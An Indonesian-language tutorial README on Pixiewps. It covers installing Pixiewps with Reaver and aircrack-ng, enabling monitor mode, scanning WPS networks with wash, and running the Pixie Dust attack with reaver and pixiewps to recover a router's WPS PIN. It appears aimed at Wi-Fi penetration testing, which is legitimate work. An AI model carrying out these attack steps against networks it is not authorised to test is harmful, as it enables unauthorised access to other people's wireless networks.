# Pixiewps

![Pixiewps](https://github.com/fixploit03/Pentest-WiFi/blob/main/tools/pixiewps/img/pixiewps.jpg)

## Instalasi

Kali Linux:

1. Menggunakan packet manager (`apt`):

   ```
   sudo apt-get update
   sudo apt install pixiewps aircrack-ng reaver
   ```

2. Melalui compile dari source:
   
   ```
   sudo apt-get update
   sudo apt-get install build-essential libssl-dev git
   git clone https://github.com/wiire-a/pixiewps
   cd pixiewps
   make
   sudo make install
   ```

## Setup Adapter Wi-Fi

1. Pasang adapter Wi-Fi ke laptop/PC.
2. Pada aplikasi VirtualBox klik tab `Devices` -> `USB` -> `Jenis/merek`.
3. Pastikan checkbox nya sudah tercentang.
4. Buka terminal.
5. Ketikkan `iwconfig`, pastikan nama interface `wlan0` muncul.
6. Kalau sudah muncul, aktifkan mode monitor menggunakan:

   ```
   sudo airmon-ng check kill
   sudo airmon-ng start wlan0
   ```
7. Cek kembali menggunakan `iwconfig` apakah mode interfacenya sudah berubah menjadi mode `Monitor`.
8. Cek packet injection menggunakan:

   ```
   sudo aireplay-ng --test wlan0
   ```
   
## Penggunaan

**1. Scan Wi-Fi WPS:**

```
sudo wash -i [interface]
```

**2. Pilih Taraget**

Pastikan status `Lck` (Lock) tidak menunjukkan `YES`. Jika `YES`, artinya fitur WPS sedang terkunci (tidak bisa diserang).

**3. Jalankan Serangan:**

1. Jalankan Reaver untuk mengumpulkan data WPS:

   ```
   sudo reaver -i [interface] -b [bssid] -c [channel] -K -vv
   ```
2. Jalankan Pixiewps dengan data yang didapat:

   ```
   sudo pixiewps -e [pke] -r [pkr] -s [e-hash1] -z [e-hash2] -a [authkey] -n [e-nonce]
   ```

   Keterangan:
   - `-e [pke]` : Enrollee Public Key -> len = 192
   - `-r [pkr]` : Registrar Public Key -> len = 192
   - `-s [e-hash1]` : Enrollee Hash1 -> len = 32
   - `-z [e-hash2]` : Enrollee Hash2 -> len = 32
   - `-a [authkey]` : Authentication Session Key -> len = 32
   - `-n [e-nonce]` : Enrollee Nonce -> len = 16

## Video Demonstrasi

[https://youtu.be/E1ERlb9HetY?si=5BftM5l4yPF3Ti0e](https://youtu.be/E1ERlb9HetY?si=5BftM5l4yPF3Ti0e)
